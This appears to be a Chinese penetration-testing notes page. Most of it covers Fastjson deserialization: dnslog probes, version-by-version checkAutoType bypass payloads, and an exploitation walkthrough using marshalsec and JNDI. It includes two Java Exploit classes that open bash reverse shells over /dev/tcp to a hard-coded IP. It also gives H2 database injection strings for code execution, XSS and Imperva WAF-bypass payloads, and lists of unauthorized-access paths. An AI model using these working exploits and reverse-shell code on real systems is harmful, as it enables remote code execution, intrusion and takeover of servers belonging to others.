---
title: 渗透测试
---

渗透测试的技巧和工具。
tmp number/email：https://www.smsk.cc/

# CROS和CSRF

**参考文档：**
[跨源资源共享（CORS）](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Access_control_CORS)

#  Apache Shiro RememberMe 1.2.4 反序列化过程命令执行漏洞
1. poc验证
   
   https://github.com/Medicean/VulApps/blob/master/s/shiro/1/poc.py

2. 反弹shell
   - 下载：https://github.com/frohoff/ysoserial.git 
   

# Tomcat Ajp(CVE-2020-1938)

## 安装版

## spring boot embedded


# fastjson专题

建议在Linux下操作，我在Windows上操作好久没复现出来，遇到很多坑，最后在Linux成功复现，后来检查貌似是Windows上编译的class文件有问题。复现环境如下。  
系统版本：kali-2020.3  
jdk版本：jdk-8u151-linux-x64.tar.gz

## 漏洞探测
1.  检查和利用脚本（谨慎使用，测试结果存在泄露风险，毕竟调用的是别人的API）
    [github](https://github.com/mrknow001/fastjson_rec_exploit.git)
2.  探测Fastjson:

    >{"rand1":{"@type":"java.net.InetAddress","val":"http://dnslog"}}

    >{"rand2":{"@type":"java.net.Inet4Address","val":"http://dnslog"}}

    >{"rand3":{"@type":"java.net.Inet6Address","val":"http://dnslog"}}

    >{"rand4":{"@type":"java.net.InetSocketAddress"{"address":,"val":"http://dnslog"}}}

    >{"rand5":{"@type":"java.net.URL","val":"http://dnslog"}}

    >//一些畸形payload，不过依然可以触发dnslog：

    >{"rand6":{"@type":"com.alibaba.fastjson.JSONObject", 
    {"@type": "java.net.URL", "val":"http://dnslog"}}""}}

    >{"rand7":Set[{"@type":"java.net.URL","val":"http://dnslog"}]}

    >{"rand8":Set[{"@type":"java.net.URL","val":"http://dnslog"}

    >{"rand9":{"@type":"java.net.URL","val":"http://dnslog"}:0

## poc
1. ver<=1.2.24:  
  1.2.24及之前没有任何防御，并且autotype默认开启。
    
        {
        "rand1": {
          "@type": "com.sun.rowset.JdbcRowSetImpl",
          "dataSourceName": "ldap://localhost:1389/Object",
          "autoCommit": true
            }
        }

- ver>=1.2.25&ver<=1.2.41  
  从1.2.25开始默认关闭了autotype支持，并且加入了checkAutotype，加入了黑名单+白名单来防御autotype开启的情况。在1.2.25到1.2.41之间，发生了一次checkAutotype的绕过。loadclass会去掉className前后的`L`和`;`, 所以可给@type指定的类前后加上L和;来绕过黑名单检测。
       
        {
        "rand1": {
          "@type": "Lcom.sun.rowset.JdbcRowSetImpl;",
          "dataSourceName": "ldap://localhost:1389/Object",
          "autoCommit": true
        }
      }
- ver=1.2.42  
  在1.2.42对1.2.25-1.2.41的checkAutotype绕过进行了修复，将黑名单改成了十进制，对checkAutotype检测也做了相应变化。判断了className前后是不是L和;，如果是，就截取第二个字符和到倒数第二个字符。所以1.2.42版本的checkAutotype绕过就是前后双写LL和;;，截取之后过程就和1.2.25-1.2.41版本利用方式一样了。
    
      {
        "rand1": {
          "@type": "LLcom.sun.rowset.JdbcRowSetImpl;;",
          "dataSourceName": "ldap://localhost:1389/Object",
          "autoCommit": true
        }
      }

- ver=1.2.43  
  1.2.43对于1.2.42的绕过修复方式：在第一个if条件之下（L开头，;结尾），又加了一个以LL开头的条件，如果第一个条件满足并且以LL开头，直接抛异常。所以这种修复方式没法在绕过了。但是上面的loadclass除了L和;做了特殊处理外，[也被特殊处理了，又再次绕过了checkAutoType：

      {
          "rand1":{
              "@type":"[com.sun.rowset.JdbcRowSetImpl"[
                  {
                    "dataSourceName":"ldap://127.0.0.1:1389/Exploit",
                    "autoCommit":true
                  ]
              }
        }

- ver<1.2.47**不开启autotype**
  这个版本发生了**不开启autotype**情况下能利用成功的绕过。解析一下这次的绕过：

  - 利用到了java.lang.class，这个类不在黑名单，所以checkAutotype可以过
  - 这个java.lang.class类对应的deserializer为MiscCodec，deserialize时会取json串中的val值并load这个val对应的class，如果fastjson cache为true，就会缓存这个val对应的class到全局map中
  - 如果再次加载val名称的class，并且autotype没开启（因为开启了会先检测黑白名单，所以这个漏洞开启了反而不成功），下一步就是会尝试从全局map中获取这个class，如果获取到了，直接返回.
    ``` json
    {
        "a":{
            "@type":"java.lang.Class",
            "val":"com.sun.rowset.JdbcRowSetImpl"
        },
        "b":{
            "@type":"com.sun.rowset.JdbcRowSetImpl",
            "dataSourceName":"rmi://172.20.16.121:8000/Exploit",
            "autoCommit":true
        }
    }
    ```

## 利用流程

  - 安装JDK8
  - 编辑Exploit.java[^1Exploit.java][^2Exploit.java] ，编译成Exploit.class: `javac Exploit.java`。
  - 在Exploit.class文件目录下运行python服务器：`python3 -m http.server 80`（python2 -m SimpleHTTPServer 80）
  - 安装Maven，git下载marshalsec，切换到pom文件目录下，打包构建：`mvn clean package -DskipTests`（具体可以查看READEME文件），打包后到target目录下找到jar包。

  - 运行ldap或者rmi服务，端口7776。 http://172.20.16.121/#Exploit 为之前运行的python服务，IP换成自己的地址::  

          java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer http://172.20.134.239/#Exploit 7776

  - burpsuite发送payload::

         {
          "name":{
              "@type":"java.lang.Class",
              "val":"com.sun.rowset.JdbcRowSetImpl"
          },
          "x":{
              "@type":"com.sun.rowset.JdbcRowSetImpl",
              "dataSourceName":"ldap://172.20.16.121:7776/Exploit",
              "autoCommit":true
          }
      }

[^1Exploit.java]:反弹shell①:

    ``` java

        import javax.naming.Context;
        import javax.naming.Name;
        import javax.naming.spi.ObjectFactory;
        import java.io.IOException;
        import java.util.Hashtable;


        public class Exploit{
            public Exploit() {}

            static
            {
                try {
                    String[] cmds = System.getProperty("os.name").toLowerCase().contains("win")
                            ? new String[]{"cmd.exe","/c", "calc.exe"}
                            : new String[]{"bash", "-c", "/bin/bash -i >&amp; /dev/tcp/172.20.16.121/8000 0>&amp;1"};
                            //: new String[]{"bash", "-c", "/bin/bash -i >& /dev/tcp/172.20.16.121/8000 0>&1"};
                    Runtime.getRuntime().exec(cmds);
                } catch (Exception e) {
                    e.printStackTrace();
                }
            }

            //public static void main(String[] args) {
               // Exploit e = new Exploit();
                //System.out.println("hello world");
          //  }
        }
    ```

[^2Exploit.java]:反弹shell②:

    ``` java

        import javax.naming.Context;
        import javax.naming.Name;
        import javax.naming.spi.ObjectFactory;
        import java.io.IOException;
        import java.util.Hashtable;
        import java.net.InetAddress;


        public class Exploit{
            public Exploit() {}

            static
            {
                try {
                    String[] cmds = new String[]{"/bin/bash","-c","exec 5<>/dev/tcp/172.20.16.121/8000;cat <&5 | while read line; do $line 2>&5 >&5; done"};
                    //String[] cmds = new String[]{"/bin/sh","-c", "ping mytest.42e9vz.dnslog.cn"};
                    Runtime.getRuntime().exec(cmds);
                } catch (Exception e) {
                    e.printStackTrace();
                }
            }

        //    public static void main(String[] args) {
        //        Exploit e = new Exploit();
        //        //System.out.println("hello world");
        //    }
        }
    ```

参考链接：

- **[ysoserial](https://github.com/frohoff/ysoserial)**
- **[Java-Deserialization-Cheat-Sheet](https://github.com/GrrrDog/Java-Deserialization-Cheat-Sheet)**
- [Fastjson 反序列化漏洞史](https://paper.seebug.org/1192/)
- [vulnhub](github.com/vulhub/vulhub)
- [fastjson漏洞复现](https://saucer-man.com/information_security/346.html)
- [Fastjson系列四------1.2.25-1.2.47反序列化漏洞（无需开启AutoType）](https://www.mi1k7ea.com/2019/11/11/Fastjson%E7%B3%BB%E5%88%97%E5%9B%9B%E2%80%94%E2%80%941-2-25-1-2-47%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%EF%BC%88%E6%97%A0%E9%9C%80%E5%BC%80%E5%90%AFAutoType%EF%BC%89/)
- [cve-2019-14540-exploit](https://github.com/LeadroyaL/cve-2019-14540-exploit)
- [fastjson 反弹shell](https://www.cnblogs.com/mysticbinary/p/12788019.html)
- [marshalsec](https://github.com/mbechler/marshalsec)
- [fastjson-blacklist](https://github.com/LeadroyaL/fastjson-blacklist)
- [Fastjson 反序列化漏洞史](https://paper.seebug.org/1192/)
- [Java-Deserialization-Cheat-Sheet](https://github.com/GrrrDog/Java-Deserialization-Cheat-Sheet)
- [fastjson漏洞复现](https://saucer-man.com/information_security/346.html)
- [vulhub \--
    fastjson/1.2.24-rce](https://github.com/vulhub/vulhub/tvulnhub%20--%20ree/master/fastjson/1.2.24-rce)
- [fastjson 1.2.47
    rce](https://blog.th3wind.xyz/posts/1479992369.html)
- [Fastjson历史漏洞研究（一）](http://blog.topsec.com.cn/fastjson%e5%8e%86%e5%8f%b2%e6%bc%8f%e6%b4%9e%e7%a0%94%e7%a9%b6%ef%bc%88%e4%b8%80%ef%bc%89/)

# 爬虫代理池

1.  [github](https://github.com/jhao104/proxy_pool)

# H2数据库盲注

1.  创建函数:

        method=pullmsg&udid=-2';CREATE ALIAS test AS $$ @CODE void sleeptest() throws Exception{ Thread.sleep(3000);}$$;--

2.  调用函数:

        method=pullmsg&udid=-1';select test();--

3.  命令执行:

        https://mthbernardes.github.io/rce/2018/03/14/abusing-h2-database-alias.html

# SQLmap

1. 指定参数

# JWT(Json Web Token)安全

1.  jwt解析和生成网站:

        http://jwt.io

2.  jwt secret破解:

        https://github.com/brendan-rius/c-jwt-cracker

# 关闭火狐浏览器网络检测

在搜索地址栏输入about:config 搜索
network.captive-portal-service.enabled，并将值设为false

# 一句话payload

一句话payload同时检查SQL注入、xss等漏洞:

    '"><svg onload=prompt(5);>{{7*7}} 

# imperva绕过

imperva WAF绕过payload

    <a href=javas&Tab;cript:confirm(1) >  //--tab按键和空格等特殊字符
    <details open ontoggle=alert(1)>      //待确认，目前未能绕过
    <details open ontoggle=top['al'+'ert']('1')> //待确认，目前未能绕过

# 目录暴破

**dirb和dirbuster字典中如果存在以`#`号开头的需要做特殊处理**，以`#`开头会被判断为注释，eg：http://examples.com/#/list

1. druid未授权访问
   
        /druid/weburi.html
        /druid/index.html
        

2. swagger-ui
      
        /swagger-ui.html\#

3. Tomcat示例文件

        /docs
        /examples

4. Actuator端点未授权访问

    /dump 显示线程转储（包括堆栈跟踪） 
    /trace 显示最后几条HTTP消息（可能包含会话标识符） 
    /logfile 输出日志文件的内容 
    /shutdown 关闭应用程序 
    /mappings 显示所有MVC控制器映射 
    /env 提供对配置环境的访问 
    /restart 重新启动应用程序

部分版本需要加上 **/actuator/** dump

# nginx安全配置
1. 只接受GET/POST请求

        if ($request_method !~* GET|POST) {
            return 403;
        }


1.  确保网站没有被嵌入到别人的站点里面，从而避免 clickjacking 攻击:

        add_header X-Frame-Options "SAMEORIGIN";

2.  禁止其他站点访问您的资源:

        add_header Access-Control-Allow-Origin "SAMEORIGIN";

3.  在Web服务器防止Host头攻击:

        if ($http_Host !~* ^域名1$|^域名2$|^IP1:端口$)
        {
            return 403;
        }

# csrf

## json csrf

1.  POSTbody需要以JSON格式发送，而这种格式如果用HTML表单元素来构建的话会比较麻烦。
2.  Content-Type头需要设置为application/json。设置自定义Header需要使用XMLHttpRequests，而它还会向服务器端发送OPTIONS预检请求，服务器不响应OPTIONS请求。
3.  需要注意的是，在原始的数据包里Content-Type的值是application/json，而以form去提交是没法设置enctype为application/json的，在这里设置为text/plain，那么如何设置Content-Type的值呢
4.  需要注意的是，该请求中的Content-Type头被设置成了application/x-www-form-urlencoded，因为服务器需要接收URL编码后的HTML表单数据。
5.  那我们为何不能使用这个PoC来利用JSON端点中的CSRF呢？原因如下：
    a)  POSTbody需要以JSON格式发送，而这种格式如果用HTML表单元素来构建的话会比较麻烦。
    b)  Content-Type头需要设置为application/json。设置自定义Header需要使用XMLHttpRequests，而它还会向服务器端发送OPTIONS预检请求。
6.  解决方案swf_jason_csrf

参考链接：[swf_json_csrf](https://github.com/sp1d3r/swf_json_csrf) 

- GitHub下载部署
    https://github.com/sp1d3r/swf_json_csrf
- 请求方式
    http://127.0.0.1/read.html?jsonData={%22roleId%22:8}&php_url=http://127.0.0.1/test.php&endpoint=https://flyhi.com/

参考链接:

    https://www.cnblogs.com/blacksunny/p/7930126.html
    https://www.freebuf.com/articles/web/164234.html